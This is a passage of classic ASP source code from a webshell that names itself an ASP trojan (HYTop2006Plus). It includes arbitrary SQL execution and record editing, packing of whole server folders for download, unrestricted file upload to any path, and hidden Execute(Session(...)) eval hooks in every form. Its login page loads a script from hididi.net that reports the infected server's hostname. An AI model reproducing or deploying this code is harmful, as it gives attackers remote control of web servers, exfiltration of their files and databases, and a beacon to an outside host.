	For Each objTable In Cat.Tables
		Echo "&lt;span class=fixSpan title='" &amp; objTable.Name &amp; "' onclick=""Command('Query',this.title);this.disabled=true;"" "
		Echo "style='width:94%;padding-left:8px;cursor:hand;'>"
		If strTable = objTable.Name Then
			Echo "&lt;u>" &amp; objTable.Name &amp; "&lt;/u>"
		 Else
			Echo objTable.Name
		End If
		Echo "&lt;/span>"
	Next
	Echo "&lt;/td>&lt;td valign=top>"

	If LCase(Left(sql, 7)) = "select " Then
		rs.Open sql, conn, 1, 1
		ChkErr(Err)
		rs.PageSize = PageSize
		If Not rs.Eof Then
			rs.AbsolutePage = intPage
		End If

		Echo "&lt;div align=left>&lt;table border=1 width=490>"
		Echo "&lt;tr>"
		Echo "&lt;td height=22 class=trHead>&amp;nbsp;&lt;/td>"
		Echo "&lt;/tr>"
		Echo "&lt;tr>"
		Echo "&lt;td height=22 class=td width=100>&amp;nbsp;查询&lt;/td>"
		Echo "&lt;/tr>&lt;tr>&lt;td align=center>"
		Echo "&lt;div>&lt;select name=Fields>"
		For Each x In rs.Fields
			Echo "&lt;option value=""" &amp; x.Name &amp; """>" &amp; x.Name &amp; "&lt;/option>"
		Next
		Echo "&lt;/select>"
		Echo "&lt;select name=JoinTag>&lt;option value=' like '>like&lt;/option>&lt;option value='='>=&lt;/option>&lt;/select>"
		Echo "&lt;input name=KeyWord style='width:200px;'>"
		Echo "&lt;select name=JoinTag2>&lt;option value=' And '>And&lt;/option>&lt;option value=' Or '>Or&lt;/option>&lt;/select> "
		Echo "&lt;input type=button value=+ onclick=""this.parentElement.outerHTML+='&lt;div>'+this.parentElement.innerHTML+'&lt;/div>';"">"
		Echo "&lt;input type=button value=- onclick=""this.parentElement.outerHTML='';"">&lt;/div> "
		Echo "&lt;input type=button value=查询 onclick=this.form.sql.value='';this.form.param.value='1';this.form.theAct.value='Query';this.form.submit();>"
		Echo "&lt;/td>&lt;/tr>"
		Echo "&lt;tr>&lt;td class=td>&amp;nbsp;&lt;/td>&lt;/tr>"
		Echo "&lt;/table>&lt;/div>&lt;br/>"
		
		If rs.Fields.Count > 0 Then
			strPrimaryKey = GetPrimaryKey(strTable)

			Echo "&lt;table border=1 align=left cellpadding=0 cellspacing=0>"
			Echo "&lt;tr>"
			Echo "&lt;td height=22 class=trHead colspan=" &amp; rs.Fields.Count + 1 &amp; ">&amp;nbsp;&lt;/td>"
			Echo "&lt;/tr>"
			Echo "&lt;tr>"
			Echo "&lt;td height=22 class=td width=100 align=center>操作&lt;/td>"
			For j = 0 To rs.Fields.Count - 1
				Echo "&lt;td height=22 class=td width=130>&lt;span class=fixSpan title='" &amp; rs.Fields(j).Name &amp; "' style='width:125px;padding-left:5px;'>" &amp; rs.Fields(j).Name &amp; "&lt;/span>&lt;/td>"
			Next
			For i = 1 To rs.PageSize
				If rs.Eof Then Exit For
				Echo "&lt;/tr>"
				Echo "&lt;tr valign=top>"
				Echo "&lt;td height=22 align=center>"
				If strPrimaryKey &lt;> "" Then
					Echo "&lt;input type=button value=编辑 title='编辑/添加' onclick=showSqlEdit('" &amp; strPrimaryKey &amp; "','" &amp; rs(strPrimaryKey) &amp; "');>"
					Echo "&lt;input type=button value=删除 onclick=sqlDelete('" &amp; strPrimaryKey &amp; "','" &amp; rs(strPrimaryKey) &amp; "');>&lt;/td>"
				 Else
					Echo "&lt;input type=button value=编辑 title='编辑/添加' onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');showSqlEdit('" &amp; rs.Fields(0).Name &amp; "','" &amp; rs(rs.Fields(0).Name) &amp; "');>"
					Echo "&lt;input type=button value=删除 onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');sqlDelete('" &amp; rs.Fields(0).Name &amp; "','" &amp; rs(rs.Fields(0).Name) &amp; "');>&lt;/td>"
				End If
				For j = 0 To rs.Fields.Count - 1
					Echo "&lt;td height=22>&lt;span class=fixSpan style='width:125px;padding-left:5px;'>" &amp; HtmlEncode(IIf(Len(rs(j)) > 50, Left(rs(j), 50), rs(j))) &amp; "&lt;/span>&lt;/td>"
				Next
				Echo "&lt;/tr>"
				rs.MoveNext
			Next
		End If
		Echo "&lt;tr>"
		Echo "&lt;td height=22 class=td colspan=" &amp; rs.Fields.Count + 1 &amp; ">"
		JavaScript("GetPageList(" &amp; intPage &amp; ", '" &amp; rs.RecordCount &amp; "','" &amp; rs.PageCount &amp; "', 10, '');")
		Echo "&lt;/td>&lt;/tr>&lt;/table>"
		rs.Close
	 Else
		Set rs = conn.Execute(sql, i, &amp;H0001)
		ChkErr(Err)
		If rs.Fields.Count > 0 Then
			Echo "&lt;table border=1 align=left cellpadding=0 cellspacing=0>"
			Echo "&lt;tr>"
			Echo "&lt;td height=22 class=trHead colspan=" &amp; rs.Fields.Count &amp; ">&amp;nbsp;&lt;/td>"
			Echo "&lt;/tr>&lt;tr>"
			sExec = "&lt;tr height=22>"
			For i = 0 To rs.Fields.Count - 1
				Echo "&lt;td height=22 class=td style='padding-left:7px;'>" &amp; rs.Fields(i).Name &amp; "&lt;/td>"
				sExec = sExec &amp; "&lt;td style='padding:7px;'>{$" &amp; i &amp; "}&lt;/td>"
			Next
			sExec = sExec &amp; "&lt;/tr>"
			Echo "&lt;/tr>"
			
			Do Until rs.EOF
				For i = 0 To rs.Fields.Count - 1
					sExec = Replace(sExec, "{$" &amp; i &amp; "}", StrEncode(rs(i)) &amp; "&lt;br />{$" &amp; i &amp; "}")
				Next
				rs.MoveNext
			Loop
			
			For i = 0 To rs.Fields.Count - 1
				sExec = Replace(sExec, "&lt;br />{$" &amp; i &amp; "}", "")
			Next
			Echo sExec &amp; "&lt;/table>"
		Else
			Echo "&lt;script>alert('查询执行成功,按确定返回.\n刷新后可以看到执行效果.');history.back();&lt;/script>"
		End If
		Set rs = Nothing
		Set Cat = Nothing
		DestoryConn()
		Exit Sub
	End If

	Echo "&lt;/td>"
	Echo "&lt;/tr>"

	Echo sFooter
	
	Set rs = Nothing
	Set Cat = Nothing
	DestoryConn()
End Sub

Sub SqlShowEdit()
	Dim intFindI, intFindJ, intFindK, intFindL, intFindM, strJoinTag, multiTables, aParam
	Dim i, x, rs, sql, strTable, strExtra, strParam, intI, strColumn, strValue, strPrimaryKey
	If isDebugMode = False Then On Error Resume Next
	sql = GetPost("sql")
	strParam = GetPost("param")
	strTable = GetPost("theTable")
	intI = InStr(strParam, "!")
	intFindI = InStr(LCase(sql), " where")
	intFindJ = InStrRev(LCase(sql), "order ")
	intFindK = IIf(LCase(Right(sql, 4)) = "desc", "1", "0")
	strValue = Mid(strParam, intI + 1)
	strColumn = Left(strParam, intI - 1)
	strExtra = IIf(theAct = "next", ">", IIf(theAct = "pre", "&lt;", ""))
	
	If intFindJ > 0 Then sql = Left(sql, intFindJ - 1)
	If intFindI > 0 Then
		strJoinTag = ") And "
		sql = Left(sql, intFindI + 5) &amp; "(" &amp; Mid(sql, intFindI + 6)
	 Else
		strJoinTag = " Where "
	End If
	If intFindK > 0 Then strExtra = IIf(strExtra = ">", "&lt;", IIf(strExtra = "&lt;", ">", ""))

	CreateConn()
	strPrimaryKey = GetPrimaryKey(strTable)
	Set rs = Server.CreateObject("Adodb.RecordSet")

	If strExtra &lt;> "" And IsNumeric(strValue) = True Then
		sql = "Select Top 1" &amp; Mid(sql, 7) &amp; strJoinTag
		sql = sql &amp; strColumn &amp; " " &amp; strExtra &amp; " " &amp; strValue &amp; " Order By " &amp; strColumn &amp; IIf(strExtra = "&lt;", " Desc", " Asc")
	 Else
		sql = sql &amp; strJoinTag &amp; strColumn &amp; " like '" &amp; Replace(strValue, "'", "''") &amp; "'"
	End If

	intFindM = InStr(LCase(sql), "from")
	intFindI = InStr(LCase(sql), " where")
	intFindL = InStr(intFindM, LCase(sql), ",", 1)
	If intFindL > 0 Then
		If (intFindL > intFindM) And (intFindL &lt; intFindI) Then
			multiTables = True
		End If
	End If
	
	If theAct = "dbdownfile" Then
		aParam = Split(strParam, "!")
		strValue = Replace(aParam(1) &amp; "!" &amp; aParam(2), "'", "''")
		sql = Replace(sql, strValue, Replace(aParam(1), "'", "''"))
		Set rs = conn.Execute(sql)
		DBDownTheFile(rs(aParam(2)))
		Set rs = Nothing
		Response.End()
	End If
	
	If theAct &lt;> "edit" Then
		rs.Open sql, conn, 1, 3
		ChkErr(Err)
		If rs.Eof Then
			Echo "&lt;script>alert('该记录不存在!');history.back();&lt;/script>"
			Response.End()
		End If

		If theAct = "new" Then rs.AddNew

		If theAct = "del" Then
			rs.Delete
			rs.Update
			AlertThenClose("删除成功!")
			Response.End
		 Else
			If theAct &lt;> "pre" And theAct &lt;> "next" Then
				For Each x In rs.Fields
					If strPrimaryKey &lt;> x.Name Then
						rs(x.Name) = Request.Form(x.Name &amp; "_Column")
					End If
				Next
				rs.Update
			End If
			strValue = rs(strColumn)
		End If

		If theAct = "new" Then
			sql = "Select * From [" &amp; strTable &amp; "] Where " &amp; strColumn &amp; " like '" &amp; Replace(strValue, "'", "''") &amp; "'"
		End If
		rs.Close
	End If

	rs.Open sql, conn, 1, 1

	Echo "&lt;table border=1 width=600>"
	Echo "&lt;tr>"
	Echo "&lt;td height=22 class=trHead colspan=2>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td colspan=2 class=td>&lt;font face=webdings>8&lt;/font> SQL数据修改&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;input type=hidden value=PageDBTool name=PageName>"
	Echo "&lt;input type=hidden name=theAct value=save>"
	Echo "&lt;input type=hidden name=sql value=""" &amp; HtmlEncode(GetPost("sql")) &amp; """>"
	Echo "&lt;input type=hidden name=theTable value=""" &amp; strTable &amp; """>"
	Echo "&lt;input type=hidden value=""" &amp; HtmlEncode(strColumn &amp; "!" &amp; strValue) &amp; """ name=param>"
	Echo "&lt;input type=hidden value=""" &amp; HtmlEncode(GetPost("thePath")) &amp; """ name=thePath>"

	For Each x In rs.Fields
		Echo "&lt;tr>"
		Echo "&lt;td height=22 width=150>&amp;nbsp;" &amp; HtmlEncode(x.Name) &amp; "&lt;br/>&amp;nbsp;(&lt;em>" &amp; GetDataType(x.Type) &amp; "&lt;/em>)"
		If x.Type = 204 Or x.Type = 205 Then Echo "&lt;input value='下载' type=button onclick=""Command('dbdownfile','" &amp; x.Name &amp; "')"" />"
		Echo "&lt;/td>"
		Echo "&lt;td width=450>&amp;nbsp;"
		Echo "&lt;textarea style='width:436;' name=""" &amp; x.Name &amp; "_Column""" &amp; IIf(x.Type = 201 Or x.Type = 203, " rows=6", "")
		Echo IIf(x.Properties("ISAUTOINCREMENT").Value, " disabled", "") 
		Echo IIf(x.Name = strPrimaryKey, " title='主键,由于主键约束,将无法被修改,也不能出现相同值.'", "") &amp; ">"
		Echo HtmlEncode(x.value)
		Echo "&lt;/textarea>&lt;/td>&lt;/tr>"
	Next
	Echo "&lt;tr>"
	Echo "&lt;td colspan=2 class=td align=center>"
	If multiTables = False Then
		If strPrimaryKey = "" Then
			Echo "&lt;input type=button value=修改 onclick=if(confirm('确定要修改这条记录吗?\n此表没有主键,继续操作可能会导致数据库灾难,并且该错误无法被撤消.')){this.form.theAct.value='save';this.form.submit();}>"
		 Else
			Echo "&lt;input type=submit value=修改 onclick=this.form.theAct.value='save';>"
			Echo "&lt;input type=button value=添加 onclick=if(confirm('确实要添加当前为新记录吗?')){this.form.theAct.value='new';this.form.submit();};>"
			Echo "&lt;input type=button value=删除 onclick=if(confirm('确实删除当前记录吗?')){this.form.theAct.value='del';this.form.submit();};>"
		End If
	 Else
		Echo "&lt;input type=button value=暂不支持多表操作 disabled>"
	End If
	Echo "&lt;input type=reset value=重置>&lt;input type=button value=关闭 onclick='window.close();'>"
	If IsNumeric(strValue) = True Then
		Echo "&lt;input type=button value=上一条 onclick=""this.form.theAct.value='pre';this.form.submit();"">"
		Echo "&lt;input type=button value=下一条 onclick=""this.form.theAct.value='next';this.form.submit();"">"
	End If
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/table>"
	
	rs.Close
	Set rs = Nothing
	DestoryConn()
End Sub

Sub CreateConn()
	Dim connStr, mdbInfo, userName, passWord, strPath
	If isDebugMode = False Then On Error Resume Next
	Set conn = Server.CreateObject("Adodb.Connection")
	If LCase(Left(thePath, 4)) = "sql:" Then
		connStr = Mid(thePath, 5)
		isSqlServer = True
	 Else
		mdbInfo = Split(thePath, ";")
		strPath = mdbInfo(0)
		strPath = strPath
		ChkErr(Err)
		If UBound(mdbInfo) >= 2 Then
			userName = mdbInfo(1)
			passWord = mdbInfo(2)
		End If
		connStr = Replace(accessStr, "{$dbSource}", strPath)
		connStr = Replace(connStr, "{$userId}", userName)
		connStr = Replace(connStr, "{$passWord}", passWord)
	end if
	conn.Open connStr
	ChkErr(Err)
End Sub

Sub DestoryConn()
	conn.Close
	Set conn = Nothing
End Sub

Function GetDataType(flag)
	Dim str
	Select Case flag
		Case 0 : str = "EMPTY"
		Case 2 : str = "SMALLINT"
		Case 3 : str = "INTEGER"
		Case 4 : str = "SINGLE"
		Case 5 : str = "DOUBLE"
		Case 6 : str = "CURRENCY"
		Case 7 : str = "DATE"
		Case 8 : str = "BSTR"
		Case 9 : str = "IDISPATCH"
		Case 10 : str = "ERROR"
		Case 11 : str = "BIT"
		Case 12 : str = "VARIANT"
		Case 13 : str = "IUNKNOWN"
		Case 14 : str = "DECIMAL"
		Case 16 : str = "TINYINT"
		Case 17 : str = "UNSIGNEDTINYINT"
		Case 18 : str = "UNSIGNEDSMALLINT"
		Case 19 : str = "UNSIGNEDINT"
		Case 20 : str = "BIGINT"
		Case 21 : str = "UNSIGNEDBIGINT"
		Case 72 : str = "GUID"
		Case 128 : str = "BINARY"
		Case 129 : str = "CHAR"
		Case 130 : str = "WCHAR"
		Case 131 : str = "NUMERIC"
		Case 132 : str = "USERDEFINED"
		Case 133 : str = "DBDATE"
		Case 134 : str = "DBTIME"
		Case 135 : str = "DBTIMESTAMP"
		Case 136 : str = "CHAPTER"
		Case 200 : str = "VARCHAR"
		Case 201 : str = "LONGVARCHAR"
		Case 202 : str = "VARWCHAR"
		Case 203 : str = "LONGVARWCHAR"
		Case 204 : str = "VARBINARY"
		Case 205 : str = "LONGVARBINARY"
		Case Else : str = flag
	End Select
	GetDataType = str
End Function

Function GetPrimaryKey(strTable)
	Dim rsPrimary
	If isDebugMode = False Then On Error Resume Next
	Set rsPrimary = conn.OpenSchema(28, Array(Empty, Empty, strTable))
	If Not rsPrimary.Eof Then GetPrimaryKey = rsPrimary("COLUMN_NAME")
	Set rsPrimary = Nothing
End Function

Sub PagePack()
	ShowTitle("文件夹打包/解开器")
	Server.ScriptTimeOut = 5000
	
	If theAct = "PackIt" Or theAct = "PackOne" Then
		PackIt()
		AlertThenClose("打包成功!生成为该文件夹目录下的" &amp; sPacketName &amp; "文件.\n下载下来后可以使用unpack.vbs进行解开.")
		Response.End()
	End If
	If theAct = "UnPack" Then
		UnPack()
		AlertThenClose("解开成功!解开目录为" &amp; sPacketName &amp; "所在目录.")
		Response.End()
	End If
	
	PackTable()
End Sub

Sub PackTable()
	Echo "&lt;base target=_blank>"
	Echo Replace(sHeader, "{$s}", "文件夹打包/解开器(需FSO支持)")
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;tr>"
	Echo "&lt;td width='20%'>&amp;nbsp;打包&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=thePath value='" &amp; HtmlEncode(rootPath) &amp; "' style='width:467px;'> "
	Echo "&lt;input type=hidden value=PagePack name=PageName>"
	Echo "&lt;input type=hidden value=PackIt name=theAct>"
	Echo "&lt;input type=hidden value=FSO name=Param>"
	Echo "&lt;input type=submit value='开始打包'>"
	Echo "&lt;/td>&lt;/tr>"
	Echo "&lt;/form>"
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;tr>"
	Echo "&lt;td>&amp;nbsp;解包&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=thePath value=""" &amp; HtmlEncode(sPacketName) &amp; """ style='width:467px;'> "
	Echo "&lt;input type=hidden value=PagePack name=PageName>"
	Echo "&lt;input type=hidden value=UnPack name=theAct>"
	Echo "&lt;input type=submit value='开始解包'>"
	Echo "&lt;/td>&lt;/tr>"
	Echo "&lt;/form>"
	Echo sFooter

	Echo "&lt;br />"
	Echo Replace(sHeader, "{$s}", "文件夹打包器(需Shell.Application支持)")
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;tr>"
	Echo "&lt;td width='20%'>&amp;nbsp;打包&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=thePath value='" &amp; HtmlEncode(rootPath) &amp; "' style='width:467px;'> "
	Echo "&lt;input type=hidden value=PagePack name=PageName>"
	Echo "&lt;input type=hidden value=PackIt name=theAct>"
	Echo "&lt;input type=hidden value=APP name=Param>"
	Echo "&lt;input type=submit value='开始打包'>"
	Echo "&lt;/td>&lt;/tr>"
	Echo "&lt;/form>"
	Echo sFooter

	Echo "&lt;br />"
	Echo Replace(sHeader, "{$s}", "文件夹打包器(需WScript.Shell支持)")
	Echo "&lt;form method=post action='" &amp; url &amp; "'>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;tr>"
	Echo "&lt;td width='20%'>&amp;nbsp;打包&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input name=cmdStr value='" &amp; HtmlEncode(rootPath) &amp; "' style='width:467px;'> "
	Echo "&lt;input type=hidden name=PageName value='PageWsCmdRun' />"
	Echo "&lt;input type=hidden value=PackIt name=theAct>"
	Echo "&lt;input type=submit value='开始打包'>"
	Echo "&lt;/td>&lt;/tr>"
	Echo "&lt;/form>"
	Echo sFooter
End Sub

Sub PackIt()
	Dim rs, db, conn, stream, connStr, objX, sParam, strPath, strPathB, isFolder, adoCatalog

	strPath = thePath
	sParam = GetPost("Param")
	db = strPath &amp; "\" &amp; sPacketName
	Set rs = Server.CreateObject("ADODB.RecordSet")
	Set stream = Server.CreateObject("ADODB.Stream")
	Set conn = Server.CreateObject("ADODB.Connection")
	Set adoCatalog = Server.CreateObject("ADOX.Catalog")
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" &amp; db

	If oFso.FolderExists(strPath) = False Then
		ShowErr(thePath &amp; " 目录不存在或者不允许访问!")
	End If
	If oFso.FileExists(db) = False Then
		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, P Text, fileContent Image)")
	 Else
		conn.Open connStr
	End If
	
	stream.Open
	stream.Type = 1
	rs.Open "[FileData]", conn, 3, 3

	If theAct = "PackIt" Then
		If sParam = "FSO" Then Call FsoTreeForMdb(strPath, rs, stream)
		If sParam = "APP" Then Call AppTreeForMdb(strPath, rs, stream)
	 Else
		strPath = GetPost("truePath") &amp; "\"
		For Each objX In Request.Form("checkBox")
			strPathB = strPath &amp; objX
			isFolder = oFso.FolderExists(strPathB)
			If isFolder = True Then
				Execute("Call " &amp; sParam &amp; "TreeForMdb(strPathB, rs, stream)")
			 Else
				If isDebugMode = False Then On Error Resume Next
				If InStr(sysFileList, "$" &amp; objX &amp; "$") &lt;= 0 Then
					rs.AddNew
					rs("P") = Mid(strPathB, 4)
					stream.LoadFromFile(strPathB)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next
	End If

	rs.Close
	Conn.Close
	stream.Close
	Set rs = Nothing
	Set conn = Nothing
	Set stream = Nothing
	Set adoCatalog = Nothing
End Sub

Sub UnPack()
	Dim rs, ws, str, conn, stream, connStr, strPath, theFolder
	If isDebugMode = False Then On Error Resume Next

	strPath = thePath
	str = oFso.GetParentFolderName(strPath) &amp; "\"
	Set rs = CreateObject("ADODB.RecordSet")
	Set stream = CreateObject("ADODB.Stream")
	Set conn = CreateObject("ADODB.Connection")
	connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &amp; strPath

	conn.Open connStr
	ChkErr(Err)
	rs.Open "FileData", conn, 1, 1
	stream.Open
	stream.Type = 1

	Do Until rs.Eof
		theFolder = Left(rs("P"), InStrRev(rs("P"), "\"))
		If oFso.FolderExists(str &amp; theFolder) = False Then
			CreateFolder(str &amp; theFolder)
		End If
		stream.SetEOS()
		If IsNull(rs("fileContent")) = False Then stream.Write rs("fileContent")
		stream.SaveToFile str &amp; rs("P"), 2
		rs.MoveNext
	Loop

	rs.Close
	conn.Close
	stream.Close
	Set ws = Nothing
	Set rs = Nothing
	Set stream = Nothing
	Set conn = Nothing
End Sub

Sub FsoTreeForMdb(strPath, rs, stream)
	If isDebugMode = False Then On Error Resume Next
	Dim item, theFolder, folders, files
	Set theFolder = oFso.GetFolder(strPath)
	Set files = theFolder.Files
	Set folders = theFolder.SubFolders

	For Each item In folders
		Call FsoTreeForMdb(item.Path, rs, stream)
	Next

	For Each item In files
		If InStr(sysFileList, "$" &amp; item.Name &amp; "$") &lt;= 0 Then
			rs.AddNew
			rs("P") = Mid(item.Path, 4)
			stream.LoadFromFile(item.Path)
			rs("fileContent") = stream.Read()
			rs.Update
		End If
	Next

	Set files = Nothing
	Set folders = Nothing
	Set theFolder = Nothing
End Sub

Sub AppTreeForMdb(sPath, rs, stream)
	If isDebugMode = False Then On Error Resume Next
	Dim oFolder, oMember, sFileName
	If Len(sPath) > 3 And Right(sPath, 1) = "\" Then sPath = Left(sPath, Len(sPath) - 1)
	Set oFolder = oShl.NameSpace(sPath)

	For Each oMember In oFolder.Items
		If oMember.IsFolder = True Then
			Call AppTreeForMdb(oMember.Path, rs, stream)
		Else
			sFileName = Mid(oMember.Path, InStrRev(oMember.Path, "\") + 1)
			If InStr(sysFileList, "$" &amp; sFileName &amp; "$") &lt;= 0 Then
				rs.AddNew
				rs("P") = Mid(oMember.Path, 4)
				stream.LoadFromFile(oMember.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		End If
	Next

	Set oFolder = Nothing
	Set oMember = Nothing
End Sub

Sub PageUpload()
	ShowTitle("批量文件上传")
	theAct = Request.QueryString("theAct")
	If theAct = "upload" Then
		StreamUpload()
		Echo "&lt;script>alert('上传成功!');history.back();&lt;/script>"
	End If
	ShowUpload()
End Sub

Sub ShowUpload()
	If thePath = "" Then thePath = rootPath
	Echo "&lt;form method=post onsubmit=this.Submit.disabled=true; enctype='multipart/form-data' action=?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&PageName=PageUpload&amp;theAct=upload>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo Replace(sHeader, "{$s}", "批量文件上传")
	Echo "&lt;tr>"
	Echo "&lt;td width='20%'>"
	Echo "&amp;nbsp;上传到:"
	Echo "&lt;/td>"
	Echo "&lt;td>"
	Echo "&amp;nbsp;&lt;input name=thePath type=text id=thePath value=""" &amp; HtmlEncode(thePath) &amp; """ size=48>&lt;input type=checkbox name=overWrite>覆盖模式"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td valign=top>"
	Echo "&amp;nbsp;文件选择: "
	Echo "&lt;/td>"
	Echo "&lt;td>&amp;nbsp;&lt;input id=fileCount size=6 value=1> &lt;input type=button value=设定 onclick=makeFile(fileCount.value)>"
	Echo "&lt;div id=fileUpload>"
	Echo "&amp;nbsp;&lt;input name=file1 type=file size=50>"
	Echo "&lt;/div>&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead colspan=2>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td align=center class=td colspan=2>"
	Echo "&lt;input type=submit name=Submit value=上传 onclick=this.form.action+='&amp;overWrite='+this.form.overWrite.checked;>"
	Echo "&lt;input type=reset value=重置>&lt;input type=button value=关闭 onclick=window.close();>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/table>"
	Echo "&lt;/form>"
	Echo "&lt;script language=javascript>" &amp; vbNewLine
	Echo "function makeFile(n){" &amp; vbNewLine
	Echo "	fileUpload.innerHTML = '&amp;nbsp;&lt;input name=file1 type=file size=50>'" &amp; vbNewLine
	Echo "	for(var i=2; i&lt;=n; i++)" &amp; vbNewLine
	Echo "		fileUpload.innerHTML += '&lt;br/>&amp;nbsp;&lt;input name=file' + i + ' type=file size=50>';" &amp; vbNewLine
	Echo "}" &amp; vbNewLine
	Echo "&lt;/script>"
End Sub

Sub StreamUpload()
	Dim sA, sB, aryForm, aryFile, theForm, newLine, overWrite
	Dim strInfo, strName, strPath, strFileName, intFindStart, intFindEnd
	Dim itemDiv, itemDivLen, intStart, intDataLen, intInfoEnd, totalLen, intUpLen, intEnd
	If isDebugMode = False Then On Error Resume Next
	Server.ScriptTimeOut = 99999
	newLine = ChrB(13) &amp; ChrB(10)
	overWrite = Request.QueryString("overWrite")
	overWrite = IIf(overWrite = "true", "2", "1")
	Set sA = Server.CreateObject("Adodb.Stream")
	Set sB = Server.CreateObject("Adodb.Stream")
	
	sA.Type = 1
	sA.Mode = 3
	sA.Open
	sA.Write Request.BinaryRead(Request.TotalBytes)
	sA.Position = 0
	theForm = sA.Read()
'		sA.SaveToFile "c:\001.txt", 2 ''保存到临时文件进行查看
	itemDiv = LeftB(theForm, InStrB(theForm, newLine) - 1)
	totalLen = LenB(theForm)
	itemDivLen = LenB(itemDiv)
	intStart = itemDivLen + 2
	intUpLen = 0 '上面数据的长度
	Do
		intDataLen = InStrB(intStart, theForm, itemDiv) - itemDivLen - 5 ''equals - 2(回车) - 1(InStr) - 2(回车)
		intDataLen = intDataLen - intUpLen
		intEnd = intStart + intDataLen
		intInfoEnd = InStrB(intStart, theForm, newLine &amp; newLine) - 1

		sB.Type = 1
		sB.Mode = 3
		sB.Open
		sA.Position = intStart
		sA.CopyTo sB, intInfoEnd - intStart ''保存元素信息部分
		
		sB.Position = 0
		sB.Type = 2
		sB.CharSet = "GB2312"
		strInfo = sB.ReadText()

		strFileName = ""
		intFindStart = InStr(strInfo, "name=""") + 6
		intFindEnd = InStr(intFindStart, strInfo, """", 1)
		strName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)

		If InStr(strInfo, "filename=""") > 0 Then ''>0则为文件,开始接收文件
			intFindStart = InStr(strInfo, "filename=""") + 10
			intFindEnd = InStr(intFindStart, strInfo, """", 1)
			strFileName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)
			strFileName = Mid(strFileName, InStrRev(strFileName, "\") + 1)
		End If

		sB.Close
		sB.Type = 1
		sB.Mode = 3
		sB.Open
		sA.Position = intInfoEnd + 4
		sA.CopyTo sB, intEnd - intInfoEnd - 4

		If strFileName &lt;> "" Then
			sB.SaveToFile strPath &amp; strFileName, overWrite
			ChkErr(Err)
		 Else
			If strName = "thePath" Then
				sB.Position = 0
				sB.Type = 2
				sB.CharSet = "GB2312"
				strInfo = sB.ReadText()
				thePath = strInfo
				strPath = strInfo &amp; "\"
			End If
		End If
		
		sB.Close

		intUpLen = intStart + intDataLen + 2
		intStart = intUpLen + itemDivLen + 2
	Loop Until (intStart + 2) = totalLen

	sA.Close
	Set sA = Nothing
	Set sB = Nothing
End Sub

Sub PageLogin()
	Dim passWord
	passWord = Encode(GetPost("password"))

	If theAct = "Login" Then
		If userPassword = passWord Then
			Session(m &amp; "userPassword") = userPassword
			ShowTitle("登录成功!")
			PageReadMe()
			Exit Sub
		End If
	End If
	
	If PageName = "PageOut" Then
		Session.Contents.Remove(m &amp; "userPassword")
		RedirectTo(url)
	End If
	
	If Session(m &amp; "userPassword") = userPassword Then
		PageReadMe()
		Exit Sub
	End If
	
	ShowTitle("管理登录")
	Echo "&lt;body onload=document.formx.password.focus();>"
	Echo "&lt;table width=416 align=center>"
	Echo "&lt;form method=post name=formx action=""" &amp; url &amp; """>" &amp; "&lt;input type=hidden name=""{$ThePass}"" value=Execute(Session(&amp;quot;{$ThePass}&amp;quot;))>"
	Echo "&lt;input type=hidden name=theAct value=Login>"
	Echo "&lt;input type=hidden name=PageName value='" &amp; s &amp; "'>"
	Echo "&lt;tr>"
	Echo "&lt;td align=center class=td>管 理 登 录&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td class=trHead>&amp;nbsp;&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td height=75 align=center>"
	Echo "&lt;input name=password type=password style='border:1px solid #d8d8f0;background-color:#ffffff;'> "
	Echo "&lt;input type=submit value=LOGIN style='border:1px solid #d8d8f0;background-color:#f9f9fd;'>"
	Echo "&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;tr>"
	Echo "&lt;td align=center class=td>2006PLUS @ 海阳顶端网ASP木马&lt;/td>"
	Echo "&lt;/tr>"
	Echo "&lt;/form>"
	Echo "&lt;script language=javascript src=""http://hididi.net/ASPAdmin/ASPAdmin_T.asp?theUrl=http://" &amp; Request.ServerVariables("SERVER_NAME") &amp; "&amp;productName=HYTop2006Plus"">&lt;/script>"
	Echo "&lt;/table>"
	Echo "&lt;/body>"
End Sub

Sub PageReadMe()
